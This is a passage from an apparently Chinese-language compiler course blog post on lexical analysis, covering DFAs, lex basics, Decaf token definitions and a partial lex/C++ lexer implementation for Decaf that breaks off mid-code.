src="/2020/12/31/lexical/image-20210102004101129.png" class="" title="image-20210102004101129"><img src="/2020/12/31/lexical/image-20210102004108754.png" class="" title="image-20210102004108754"><img src="/2020/12/31/lexical/image-20210102004118447.png" class="" title="image-20210102004118447"><img src="/2020/12/31/lexical/image-20210102004129896.png" class="" title="image-20210102004129896"><img src="/2020/12/31/lexical/image-20210102004203432.png" class="" title="image-20210102004203432"><img src="/2020/12/31/lexical/image-20210102004224259.png" class="" title="image-20210102004224259"><h2 id="词法分析器使用-DFA"><a href="#词法分析器使用-DFA" class="headerlink" title="词法分析器使用 DFA"></a>词法分析器使用 DFA</h2><ul><li>每一个 Token 通过正则表达式 $r_i$ 定义</li><li>合并所有 $r_i$ 为一个更大表达式  $R = (r_1 | r_2 | … | r_n)$</li><li>将 R 转换成 NFA，DFA，最后优化</li></ul><img src="/2020/12/31/lexical/image-20210102004532585.png" class="" title="image-20210102004532585"><h2 id="编写-Decaf-语言词法分析器"><a href="#编写-Decaf-语言词法分析器" class="headerlink" title="编写 Decaf 语言词法分析器"></a>编写 Decaf 语言词法分析器</h2><p>decaf 语言是为学习这门课程设计的语言，具体信息 PDF 如下</p><a href="/2020/12/31/lexical/Decaf.pdf" title="Decaf.pdf">Decaf.pdf</a><p>课程要求使用 lex 实现 decaf 的词法分析器， lex 是一个用于生成词法分析器代码的程序。</p><p>lex 源文件 -&gt; lex -&gt; 词法分析器C语言代码 -&gt; gcc/clang -&gt; 词法分析器</p><h3 id="lex-简单写法"><a href="#lex-简单写法" class="headerlink" title="lex 简单写法"></a>lex 简单写法</h3><ol><li><p>嵌入 C 语言代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">%&#123; .... C语言代码...  %&#125;<br><br>例如:<br>%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NUMBER     256</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IDENTIFIER 257</span><br>%&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用正则表达式定义 Token 并为每个 Token 添加处理代码</p></li></ol><p>定义正则表达式的别名， 在 lex 的最顶层定义，例如定义一个用于识别数字的正则表达式别名 num</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/* regexp definitions */</span><br>num [<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+<br></code></pre></td></tr></table></figure><ol start="3"><li>使用正则表达式定义 Token 并添加处理代码</li></ol><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel">%%<br>正则表达式 &#123;匹配处理代码，例如返回该 Token 对应的 Token 常量&#125;<br>%%<br><br>例如：<br>%%<br>&#123;num&#125;                 &#123; <span class="hljs-keyword">return</span> NUMBER; &#125;<br>[a-zA-Z][a-zA-Z0<span class="hljs-number">-9</span>]*  &#123; <span class="hljs-keyword">return</span> IDENTIFIER; &#125;<br>\n                    <span class="hljs-comment">/* silently ignore */</span><br>.                     &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; &#125;<br>%%<br></code></pre></td></tr></table></figure><p>lex 将每次接收一个 Token 都就会执行对应 token {} 中的代码，并将返回值作为 yylex() 的返回值。 yylex 从输入流解析一个 token。</p><ol start="4"><li>完整例子</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NUMBER     256</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IDENTIFIER 257</span><br>%&#125;<br><br><span class="hljs-comment">/* regexp definitions */</span><br>num [<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+<br><br>%%<br><br>&#123;num&#125;                 &#123; <span class="hljs-keyword">return</span> NUMBER; &#125;<br>[a-zA-Z][a-zA-Z0<span class="hljs-number">-9</span>]*  &#123; <span class="hljs-keyword">return</span> IDENTIFIER; &#125;<br>\n                    <span class="hljs-comment">/* silently ignore */</span><br>.                     &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; &#125;<br>%%<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> token;<br>  <span class="hljs-keyword">while</span> ((token = yylex())) &#123;<br>    <span class="hljs-keyword">switch</span> (token) &#123;<br>      <span class="hljs-keyword">case</span> NUMBER: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NUMBER: %s, LENGTH:%d\n&quot;</span>, yytext, (<span class="hljs-keyword">int</span>)yyleng); <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> IDENTIFIER: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IDENTIFIER: %s, LENGTH:%d\n&quot;</span>, yytext, (<span class="hljs-keyword">int</span>)yyleng); <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: %s not recognized\n&quot;</span>, yytext);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Decaf-Token-定义"><a href="#Decaf-Token-定义" class="headerlink" title="Decaf Token 定义"></a>Decaf Token 定义</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs csharp">T_AND            &amp;&amp;<br>T_ASSIGN         =<br>T_BOOLTYPE       <span class="hljs-built_in">bool</span><br>T_BREAK          <span class="hljs-keyword">break</span><br><span class="hljs-function">T_CHARCONSTANT   <span class="hljs-title">char_lit</span> (<span class="hljs-params">see section <span class="hljs-keyword">on</span> Character literals</span>)</span><br><span class="hljs-function">T_COMMA          ,</span><br><span class="hljs-function">T_COMMENT        comment</span><br><span class="hljs-function">T_CONTINUE       <span class="hljs-keyword">continue</span></span><br><span class="hljs-function">T_DIV            /</span><br><span class="hljs-function">T_DOT            .</span><br><span class="hljs-function">T_ELSE           <span class="hljs-keyword">else</span></span><br><span class="hljs-function">T_EQ</span>             ==<br>T_EXTERN         <span class="hljs-keyword">extern</span><br>T_FALSE          <span class="hljs-literal">false</span><br>T_FOR            <span class="hljs-keyword">for</span><br>T_FUNC           func<br>T_GEQ            &gt;=<br>T_GT             &gt;<br><span class="hljs-function">T_ID             <span class="hljs-title">identifier</span> (<span class="hljs-params">see section <span class="hljs-keyword">on</span> Identifiers</span>)</span><br><span class="hljs-function">T_IF             <span class="hljs-keyword">if</span></span><br><span class="hljs-function">T_INTCONSTANT    <span class="hljs-title">int_lit</span> (<span class="hljs-params">see section <span class="hljs-keyword">on</span> Integer literals</span>)</span><br><span class="hljs-function">T_INTTYPE        <span class="hljs-built_in">int</span></span><br><span class="hljs-function">T_LCB</span>            &#123;<br>T_LEFTSHIFT      &lt;&lt;<br>T_LEQ            &lt;=<br>T_LPAREN         (<br>T_LSB            [<br>T_LT             &lt;<br>T_MINUS          -<br>T_MOD            %<br>T_MULT           *<br>T_NEQ            !=<br>T_NOT            !<br>T_NULL           <span class="hljs-literal">null</span><br>T_OR             ||<br>T_PACKAGE        package<br>T_PLUS           +<br>T_RCB            &#125;<br>T_RETURN         <span class="hljs-keyword">return</span><br>T_RIGHTSHIFT     &gt;&gt;<br>T_RPAREN         )<br>T_RSB            ]<br>T_SEMICOLON      ;<br><span class="hljs-function">T_STRINGCONSTANT <span class="hljs-title">string_lit</span> (<span class="hljs-params">see section <span class="hljs-keyword">on</span> String literals</span>)</span><br><span class="hljs-function">T_STRINGTYPE     <span class="hljs-built_in">string</span></span><br><span class="hljs-function">T_TRUE           <span class="hljs-literal">true</span></span><br><span class="hljs-function">T_VAR            <span class="hljs-keyword">var</span></span><br><span class="hljs-function">T_VOID           <span class="hljs-keyword">void</span></span><br><span class="hljs-function">T_WHILE          <span class="hljs-keyword">while</span></span><br><span class="hljs-function">T_WHITESPACE     <span class="hljs-title">whitespace</span> (<span class="hljs-params">see section <span class="hljs-keyword">on</span> Whitespace</span>)</span><br></code></pre></td></tr></table></figure><h3 id="decaflex-lex-实现"><a href="#decaflex-lex-实现" class="headerlink" title="decaflex.lex  实现"></a>decaflex.lex  实现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs cpp">%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span>T_N_TOKEN,T_FUNC, T_INT, T_PACKAGE, T_LCB, T_RCB, T_LPAREN, T_RPAREN, T_ID, <br>      T_WHITESPACE, T_WHITESPACE_N, T_AND, T_ASSIGN, T_BOOLTYPE, T_BREAK, <br>      T_COMMA, T_CHARCONSTANT, T_COMMENT, T_CONTINUE, T_DIV, T_DOT, T_ELSE, <br>      T_EQ, T_EXTERN, T_FALSE, T_FOR, T_GEQ, T_GT, T_IF, T_INTCONSTANT, <br>      T_INTTYPE, T_LEFTSHIFT, T_LEQ, T_LSB, T_LT, T_MINUS, T_MOD, T_MULT,<br>      T_NEQ, T_NOT, T_NULL, T_OR, T_PLUS, T_RIGHTSHIFT, T_RSB, T_SEMICOLON, <br>      T_STRINGCONSTANT, T_STRINGTYPE, T_TRUE, T_VAR, T_VOID, T_WHILE, T_RETURN<br>      &#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> &amp; <span class="hljs-title">covert_newline</span><span class="hljs-params">(<span class="hljs-built_in">string</span> &amp; s)</span></span>&#123; <span class="hljs-comment">// 用来对换行转义为 \n</span><br>    <span class="hljs-built_in">string</span> tmp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; s.size(); i++)<br>      <span class="hljs-keyword">if</span>(s[i] == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        tmp += <span class="hljs-string">&quot;\\n&quot;</span>;<br>      <span class="hljs-keyword">else</span><br>        tmp += s[i];<br>    s = tmp;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br>%&#125;<br><br>%%<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    Pattern definitions for all tokens</span><br><span class="hljs-comment">  */</span><br>func                       &#123; <span class="hljs-keyword">return</span> T_FUNC; &#125;<br><span class="hljs-keyword">return</span>                     &#123; <span class="hljs-keyword">return</span> T_RETURN; &#125;<br><span class="hljs-keyword">while</span>                      &#123; <span class="hljs-keyword">return</span> T_WHILE; &#125;<br><span class="hljs-keyword">void</span>                       &#123; <span class="hljs-keyword">return</span> T_VOID; &#125;<br>var                        &#123; <span class="hljs-keyword">return</span> T_VAR; &#125;<br><span class="hljs-built_in">string</span>                     &#123; <span class="hljs-keyword">return</span> T_STRINGTYPE; &#125;<br><span class="hljs-literal">true</span>                       &#123; <span class="hljs-keyword">return</span> T_TRUE; &#125;<br>null                       &#123; <span class="hljs-keyword">return</span> T_NULL; &#125;<br><span class="hljs-keyword">int</span>                        &#123; <span class="hljs-keyword">return</span> T_INTTYPE; &#125;<br><span class="hljs-keyword">if</span>                         &#123; <span class="hljs-keyword">return</span> T_IF; &#125;<br><span class="hljs-keyword">extern</span>                     &#123; <span class="hljs-keyword">return</span> T_EXTERN; &#125;<br><span class="hljs-keyword">int</span>                        &#123; <span class="hljs-keyword">return</span> T_INT; &#125;<br><span class="hljs-keyword">for</span>                        &#123; <span class="hljs-keyword">return</span> T_FOR; &#125;<br>package                    &#123; <span class="hljs-keyword">return</span> T_PACKAGE; &#125;<br><span class="hljs-keyword">break</span>                      &#123; <span class="hljs-keyword">return</span> T_BREAK; &#125;<br><span class="hljs-keyword">continue</span>                   &#123; <span class="hljs-keyword">return</span> T_CONTINUE; &#125;<br>,                          &#123; <span class="hljs-keyword">return</span> T_COMMA; &#125;<br><span class="hljs-keyword">else</span>                       &#123; <span class="hljs-keyword">return</span> T_ELSE; &#125;<br><span class="hljs-literal">false</span>                      &#123; <span class="hljs-keyword">return</span> T_FALSE; &#125;<br>==                         &#123; <span class="hljs-keyword">return</span> T_EQ;  &#125;<br>&gt;=                         &#123; <span class="hljs-keyword">return</span> T_GEQ; &#125;<br>&gt;                          &#123; <span class="hljs-keyword">return</span> T_GT;  &#125;<br>\&lt;\&lt;                       &#123; <span class="hljs-keyword">return</span> T_LEFTSHIFT;  &#125;<br>&gt;&gt;                         &#123; <span class="hljs-keyword">return</span> T_RIGHTSHIFT; &#125;<br>\&lt;=                        &#123; <span class="hljs-keyword">return</span> T_LEQ; &#125;<br>\[                         &#123; <span class="hljs-keyword">return</span> T_LSB; &#125;<br>\]                         &#123; <span class="hljs-keyword">return</span> T_RSB; &#125;<br>\&lt;                         &#123; <span class="hljs-keyword">return</span> T_LT; &#125;<br>\-                         &#123; <span class="hljs-keyword">return</span> T_MINUS; &#125;<br>\+                         &#123; <span class="hljs-keyword">return</span> T_PLUS; &#125;<br>\%                         &#123; <span class="hljs-keyword">return</span> T_MOD; &#125;<br>\*                         &#123; <span class="hljs-keyword">return</span> T_MULT; &#125;<br>!=                         &#123; <span class="hljs-keyword">return</span> T_NEQ; &#125;<br>!                          &#123; <span class="hljs-keyword">return</span> T_NOT; &#125;<br>\|\|                       &#123; <span class="hljs-keyword">return</span> T_OR; &#125;<br>;                          &#123; <span class="hljs-keyword">return</span> T_SEMICOLON; &#125;<br>\&quot;([^\n&quot;\\]|\\(a|b|t|n|v|f|r|\\|\&#x27;|\&quot;))*\&quot; &#123; return T_STRINGCONSTANT; &#125;<br><br>([<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+(\.[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+)?)|(<span class="hljs-number">0</span>[xX][<span class="hljs-number">0</span><span class="hljs-number">-9</span>A-Fa-f]+)          &#123; <span class="hljs-keyword">return</span> T_INTCONSTANT; &#125;<br>\&#x27;([^\n&#x27;\\]|\\(a|b|t|n|v|f|r|\\|\&#x27;|\&quot;))\&#x27;        &#123; return T_CHARCONSTANT; &#125;<br><span class="hljs-string">&quot;//&quot;</span>.*<span class="hljs-string">&quot;\n&quot;</span>                 &#123; <span class="hljs-keyword">return</span> T_COMMENT; &#125;<br>\&#123;                         &#123; <span class="hljs-keyword">return</span> T_LCB; &#125;<br>\&#125;                         &#123; <span class="hljs-keyword">return</span> T_RCB; &#125;<br>\(                         &#123; <span class="hljs-keyword">return</span> T_LPAREN; &#125;<br>\)                         &#123; <span class="hljs-keyword">return</span> T_RPAREN; &#125;<br>[a-zA-Z\_][a-zA-Z\_0<span class="hljs-number">-9</span>]*   &#123; <span class="hljs-keyword">return</span> T_ID; &#125;<br>\n+[\t\r\a\v\b ]*          &#123; <span class="hljs-keyword">return</span> T_WHITESPACE_N; &#125;<br>[\t\r\a\v\b ]+             &#123; <span class="hljs-keyword">return</span> T_WHITESPACE; &#125;<br>&amp;&amp;                         &#123; <span class="hljs-keyword">return</span> T_AND; &#125;<br>=                          &#123; <span class="hljs-keyword">return</span> T_ASSIGN; &#125;<br>\/                         &#123; <span class="hljs-keyword">return</span> T_DIV; &#125;<br><span class="hljs-string">&quot;.&quot;</span>                        &#123; <span class="hljs-keyword">return</span> T_DOT; &#125; <br>.                          &#123; <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;Error: unexpected character in input&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; &#125;<br>%%<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> token;<br>  <span class="hljs-built_in">string</span> lexeme;<br>  <span class="hljs-keyword">while</span> ((token = yylex())) &#123;<br>    <span class="hljs-keyword">if</span> (token &gt; <span class="hljs-number">0</span>) &#123;<br>      lexeme.assign(yytext);<br>      <span class="hljs-keyword">switch</span>(token) &#123;<br>        <span class="hljs-keyword">case</span> T_FUNC: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_FUNC &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_INT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_INT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_PACKAGE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_PACKAGE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_LCB: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_LCB &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_RCB: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_RCB &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_LPAREN: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_LPAREN &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_RPAREN: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_RPAREN &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_ID: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_ID &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_WHITESPACE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_WHITESPACE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_WHITESPACE_N:<br>          <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_WHITESPACE &quot;</span>;<br>          <span class="hljs-keyword">for</span>( <span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; lexeme.size(); i++)<br>            <span class="hljs-keyword">if</span>( lexeme[i] == <span class="hljs-string">&#x27;\n&#x27;</span> ) <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;\\n&quot;</span>; <span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span> &lt;&lt; lexeme[i];<br>          <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>          <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">// mycode</span><br>        <span class="hljs-keyword">case</span> T_AND: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_AND &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_ASSIGN: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_ASSIGN &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_BOOLTYPE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_BOOLTYPE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_BREAK: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_BREAK &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_COMMA: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_COMMA &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_CHARCONSTANT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_CHARCONSTANT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_COMMENT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_COMMENT &quot;</span> &lt;&lt; covert_newline(lexeme) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_CONTINUE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_CONTINUE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_DIV: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_DIV &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_DOT: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_DOT &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_ELSE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_ELSE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_EQ: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_EQ &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_EXTERN: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_EXTERN &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> T_FALSE: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_FALSE &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_FOR: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_FOR &quot;</span> &lt;&lt; lexeme &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> T_GEQ: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;T_GEQ &quot;</span> &lt;&lt; lexeme 